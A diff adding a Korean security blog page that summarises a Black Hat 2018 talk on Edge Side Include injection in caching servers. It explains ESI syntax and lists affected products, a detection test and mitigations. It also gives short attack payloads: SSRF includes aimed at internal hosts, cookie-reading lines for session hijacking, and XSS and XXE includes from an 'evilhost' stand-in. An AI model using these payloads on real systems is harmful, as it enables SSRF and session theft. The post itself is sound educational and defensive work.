@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018) | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018)">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/edge-side-include-injection-web-attack/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018)">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/edge-side-include-injection-web-attack/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018)","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/edge-side-include-injection-web-attack/","datePublished":"2018-08-18T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2018-edge-side-include-injection-web-attack.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/"},{"@type":"ListItem","position":5,"name":"ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018)"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">ESI(Edge Side Include) Injection을 이용한 Web Attack(XSS, Session hijacking, SSRF / blackhat 2018)</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2018-08-18">
+                        AUGUST 18, 2018
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>주말동안 시간나면 천천히 blackhat, defcon 자료좀 볼까해서 보다보니 글로 공유드리면 괜찮을 것 같은 내용이 있어 포스팅 작성해봅니다. 바로 ESIi(ESI Injection)에 대한 내용입니다.</p>
+<p><a href="http://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf">http://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf</a></p>
+<p><a href="https://3.bp.blogspot.com/-IJtYwyzdj8w/W3gQ4YknHEI/AAAAAAAADZg/JXKNqjRzJoMvc9c0DP3W7rWbsTiGCYBRACLcBGAs/s1600/1414.png"><img loading="lazy" src="https://3.bp.blogspot.com/-IJtYwyzdj8w/W3gQ4YknHEI/AAAAAAAADZg/JXKNqjRzJoMvc9c0DP3W7rWbsTiGCYBRACLcBGAs/s640/1414.png" alt="" /></a></p>
+<h2 id="esiedge-side-include">ESI(Edge Side Include)?</h2>
+<p>우선 ESI에 대해 짚고 넘어가는게 좋을 것 같습니다. 개인적으로 이름 정도만 들어봤던지라 문서 보고 내용 좀 더 찾아보았습니다.
+ESI은 웹 캐시, LB(Load Balancer)에서 많이 등작하는 말이며 page assembly를 위한 표준 태그라고 합니다. 아카마이쪽에선 이렇게 정의합니다.</p>
+<p>&quot;ESI(Edge Side Includes)는 인터넷의 Edge에서 웹 애플리케이션의 동적 어셈블리 및 전송을 위한 웹 페이지 구성 요소를 정의하는 데 사용되는 간단한 마크업 언어&quot;</p>
+<p>결국은 HTML Tag와 같이 웹 페이지를 구성할 수 있는 태그? 마크업 같은 역할을 하며 이에 대한 내용은 코드단을 보시면 더 명확하게 이해갑니다.
+아래 링크들은 참고해주세요</p>
+<pre><code>https://www.akamai.com/kr/ko/support/esi.jsp
+https://www.w3.org/TR/esi-lang
+http://www.dbguide.net/upload/data/sem_data/Tech-iSeminar_AS10g_Webcache.pdf
+</code></pre>
+<p>HTML 코드 내에서 ESI은 아래와 같이 사용됩니다. &lt;esi: 태그로 명시되며 이 코드는 웹단에 넘어오기 전에 캐시서버에서 미리 처리되어 데이터가 넘어옵니다.</p>
+<pre><code>&lt;table&gt;
+&lt;tr&gt;
+&lt;td&gt;test&lt;/td&gt;
+&lt;td&gt;
+&lt;esi:try&gt;
+  Invalid markup here
+    &lt;esi:attempt&gt;
+        &lt;esi:include … &gt;   
+&lt;!-- 실제 코드 구성으론 &lt;esi: 이렇게 시작하지만 캐시에서 해당 부분 내용을 채우고 사용자에게 넘겨줍니다. --&gt;
+        This line is valid and will be processed.
+    &lt;/esi:attempt&gt;
+        Invalid markup here
+    &lt;esi:except&gt;
+        This HTML line is valid and will be processed.
+    &lt;/esi:except&gt;
+    Invalid markup here
+&lt;/esi:try&gt;
+&lt;/td&gt;
+</code></pre>
+<p>이런 방식으로 동작합니다.</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://4.bp.blogspot.com/-sBrB1s_t7rg/W3gRWkEZb-I/AAAAAAAADZo/Oiacmuzjv-kApdKjLsknVR5deHHFPlUIgCLcBGAs/s1600/Selection_012.png"><img loading="lazy" src="https://4.bp.blogspot.com/-sBrB1s_t7rg/W3gRWkEZb-I/AAAAAAAADZo/Oiacmuzjv-kApdKjLsknVR5deHHFPlUIgCLcBGAs/s640/Selection_012.png" alt="" /></a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FE-BE로 표현하는게 좋을지 모르겠네요. 아무튼 Client to Server 관계입니다.</td>
+</tr>
+</tbody>
+</table>
+<p>esi 문법에 따라서 여러가지 기능 수행이 가능합니다. 아래와 같이 원격지 데이터를 읽어서 페이지에 뿌려줄 수도 있고</p>
+<p>[ page1.html ]</p>
+<pre><code>&lt;html&gt;
+&lt;p&gt;This is page 1!&lt;/p&gt;
+&lt;esi:include src=&quot;///page2.html&quot;/&gt;
+&lt;/html&gt;
+</code></pre>
+<p>[ page2.html ]</p>
+<pre><code>&lt;p&gt;This is page 2!&lt;/p&gt;
+
+&lt;!-- 실제 결과로는 page1 내부에 page2 내용이 찍히게 되죠. --&gt;
+&lt;!-- 눈치채셨을 수 있겠지만, 딱봐도 SSRF 가능하네요 (_ _) --&gt;
+</code></pre>
+<p>이런식으로 쿠키나 UA 등을 가져올 수도 있습니다.</p>
+<pre><code>&lt;html&gt;
+&lt;p&gt;This is page 1!&lt;/p&gt;
+&lt;esi:vars&gt;$(HTTP_COOKIE{YOUR_COOKIE})&lt;/esi:vars&gt;
+&lt;/html&gt;
+
+&lt;!--
+참고
+
+$(HTTP_USER_AGENT) → Mozilla/5.0 (X11;[…]
+$(QUERY_STRING) → city=Montreal&amp;format=C
+$(HTTP_COOKIE) → _ga=[…]&amp;__utma=[…]
+--&gt;
+&lt;!-- 여기서도 눈치채셨을 것 같은데, 보안헤더 설정과 다르게 쿠키나 URL Query를 가져올 수 있으니.. --&gt;
+&lt;!-- 세션 탈취도 가능하겠지요. --&gt;
+</code></pre>
+<h2 id="attack-vector">Attack Vector</h2>
+<p>넵 위에서 말씀드렸듯이 쿠키값을 가져오거나 원격지 접근해서 데이터를 쓸 수 있기 때문에 SSRF, Session Hijacking이 가능합니다. 번외로 XSS도 동일하겠구요(그치만 ESI 구문 넣었을때 부터가 이미 XSS에 어느정도 취약한거기 떄문에.. )</p>
+<p>대략 어떤식으로 코드 나올지 봐보면..</p>
+<h3 id="ssrf">SSRF</h3>
+<pre><code>&lt;esi:include src=http://127.0.0.1/server-status/&gt;
+&lt;esi:include src=http://internal_domain/server_base_csrf_page/&gt;
+</code></pre>
+<h3 id="sessions-hijacking">Sessions Hijacking</h3>
+<pre><code>&lt;esi:vars&gt;$(HTTP_COOKIE{PHPSESSID})&lt;/esi:vars&gt;
+&lt;esi:vars&gt;$(HTTP_COOKIE{JSESSIONID})&lt;/esi:vars&gt;
+&lt;esi:vars&gt;$(HTTP_COOKIE{Private_Cookie})&lt;/esi:vars&gt;
+</code></pre>
+<h3 id="xss">XSS</h3>
+<pre><code>&lt;esi:include src=http://vaha.hahwul.com/test/xss.html/&gt;
+</code></pre>
+<h3 id="xxe">XXE</h3>
+<pre><code>&lt;esi:include src=&quot;http://evilhost/poc.xml&quot; dca=&quot;xslt&quot; stylesheet=&quot;http://evilhost/poc.xsl&quot; /&gt;
+</code></pre>
+<h2 id="어떤-환경에서-취약할까">어떤 환경에서 취약할까?</h2>
+<p>우선 ESI가 사용되는 환경어야 가능합니다. 맨 위에 내용대로 캐시 서버나 LB 사용여부가 중요할 것 같습니다. Client와 App Server 사이에 캐시, 로드밸런서가 있고 ESI가 사용된다고 하면 우선 가능성이 굉장히 높아지구요.</p>
+<p>추가로 ESI 태그 사용이 가능해야하기 때문에 특수문자가 삽입될 수 있어야합니다. 여기서 보편적인 XSS 공격 포인트와 유사해지며 ESI를 이용한 SSRF 형태의 공격에선 Reflected XSS 삽입 부분에서도 사용할 수 있기 때문에 캐시/LB 환경이 경우에 테스트해야할 범위가 굉장히 많아질 것 같습니다.</p>
+<p>해당 취약점에 대한 내용과 함께 언급된 2개의 서비스가 있는데, 바로 Apache Traffic Server(ATS), Oracle Web Cache입니다. 해당 서버들이 쓰이는 환경에선 무조건적으로 체크가 필요할 것 같고,
+이외에도 ESI를 사용하는 다른 서비스들 또한 체크가 필요할 것 같습니다.</p>
+<p>ATS에 대한 자세한 설명은 아래 블로그 참고 부탁드리며, Oracle Web Cache는 .. 아직 눈에 띄이는 글을 보진 못했네요.</p>
+<p>=&gt; ats : http://jiyupapa.tistory.com/15
+=&gt; owc : ??</p>
+<p>이외에도 여러가지 서비스가 있습니다.</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Include</th>
+<th>Param</th>
+<th>Headers</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ATS(Apache Traffic Server)</td>
+<td>O</td>
+<td>O</td>
+<td>O</td>
+</tr>
+<tr>
+<td>Squid3</td>
+<td>O</td>
+<td>O</td>
+<td>O</td>
+</tr>
+<tr>
+<td>Varnish Cache</td>
+<td>O</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td>Fastly</td>
+<td>O</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td>Akamai ESI Test Server</td>
+<td>O</td>
+<td>O</td>
+<td>O</td>
+</tr>
+<tr>
+<td>NodeJS - esi</td>
+<td>O</td>
+<td>O</td>
+<td>O</td>
+</tr>
+<tr>
+<td>NodeJS - nodesi</td>
+<td>O</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td>Oracle Web Cache</td>
+<td>O</td>
+<td>O</td>
+<td>O</td>
+</tr>
+</tbody>
+</table>
+<h2 id="conclusion">Conclusion</h2>
+<p>간단할 수 있느데, 분명 XSS와 공격 방식이 겹치기 떄문에 일거리가 굉장히 많아질수도 있습니다.</p>
+<p>문서에서 제시한 테스트 방법은 아주 괜찮은 것 같습니다. 그냥 ESI 지원 여부만 판단해도, 취약점 잡아내기는 좋을 것 같기 때문에, 아래 사항 체크해보고 반응이 있다면 해당 서비스의 XSS와 같이 테스트해야할 것 같네요.</p>
+<pre><code>FOO&lt;!-esi -&gt;BAR → FOOBAR (취약) 
+FOO&lt;!-foo -&gt;BAR → FOO&lt;!-foo -&gt;BAR
+</code></pre>
+<p>대응방안은 우선 XSS와 동일할 것 같습니다.</p>
+<ul>
+<li>불필요한 특수문자, 데이터 타입 처리하지 않도록 수정</li>
+<li>게시판 같이 특수문자 사용이 필요하면 White list로 태그, 핸들러 필터링</li>
+<li>문서에서 제시한 backslash 방법도 괜찬긴하나, 기능상, 우회 가능성상 크게 좋아보이진 않습니다. 참고만 해주심 되겠습니다.</li>
+</ul>
+<pre><code>&lt;esi:include src=\&quot;http://vaha.hahwul.com/test/xss.html\&quot;/&gt;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><a href="https://4.bp.blogspot.com/-sZFcQA1Ynts/W3gRjrGefnI/AAAAAAAADZs/pgHiiEWns9YKHrvEYyomHRRV6Cw7TythgCLcBGAs/s1600/Selection_013.png"><img loading="lazy" src="https://4.bp.blogspot.com/-sZFcQA1Ynts/W3gRjrGefnI/AAAAAAAADZs/pgHiiEWns9YKHrvEYyomHRRV6Cw7TythgCLcBGAs/s640/Selection_013.png" alt="" /></a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf 문서 일부</td>
+</tr>
+</tbody>
+</table>
+<p>내용은 금요일 퇴근길에 얼추 봐두었느데, 이제서야 글을 쓰네요(주말엔 정말 컴퓨터 키기 왜이리 귀찮은건지...)</p>
+<p>아무튼, 테스트해볼 공격 벡터가 늘었고, 일하거나 놀때 조금 더 신경써서 봐야겠네요.</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.akamai.com/kr/ko/support/esi.jsp">https://www.akamai.com/kr/ko/support/esi.jsp</a>
+<a href="https://www.w3.org/TR/esi-lang">https://www.w3.org/TR/esi-lang</a>
+<a href="http://www.dbguide.net/upload/data/sem_data/Tech-iSeminar_AS10g_Webcache.pdf">http://www.dbguide.net/upload/data/sem_data/Tech-iSeminar_AS10g_Webcache.pdf</a>
+<a href="http://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf">http://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf</a></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
